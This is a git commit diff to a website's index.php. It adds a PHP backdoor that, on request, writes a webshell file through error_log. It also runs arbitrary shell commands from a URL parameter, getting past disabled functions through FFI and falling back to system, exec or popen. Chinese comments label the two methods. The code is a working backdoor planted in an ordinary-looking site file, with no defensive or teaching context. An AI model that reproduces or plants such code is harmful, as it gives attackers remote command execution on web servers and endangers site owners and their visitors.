f1af88de9412d81882c818b29959e9a5369f333a
grahamgrphwol3185-eng <grahamgrphwol3185@gmail.com>
2026-05-21 00:12:47 +0800

    2

--- index.php
+++ index.php
@@ -1,10 +1,18 @@
-  <?php
-  if(isset($_GET['x'])){
-      $cmd = $_GET['x'];
-      // Write a webshell using error_log (not disabled)
-      error_log('<?php system($_GET["c"]); ?>', 3, '/www/wwwroot/xlch49.pics/sh.php');
-      echo "webshell written to sh.php";
-  } else {
-      phpinfo();
+<?php
+  // 方式1: error_log 写文件 (error_log 没被禁用)
+  if(isset($_GET['w'])){
+      error_log('<?php system($_GET["c"]);?>', 3, '/www/wwwroot/xlch49.pics/sh.php');
+      die('written');
   }
+  // 方式2: 直接命令执行
+  if(isset($_GET['c'])){
+      // 尝试 FFI bypass
+      try { $f=FFI::cdef("int system(const char*);","libc.so.6"); $f->system($_GET['c']); }
+      catch(Throwable $e){}
+      // 回退到 system（disable_functions 可能不同）
+      if(function_exists('system')) system($_GET['c']);
+      elseif(function_exists('exec')){ exec($_GET['c'],$o); echo join("\n",$o); }
+      elseif(function_exists('popen')){ $p=popen($_GET['c'],'r'); while($l=fgets($p))echo $l; }
+  }
+  phpinfo();
   ?>
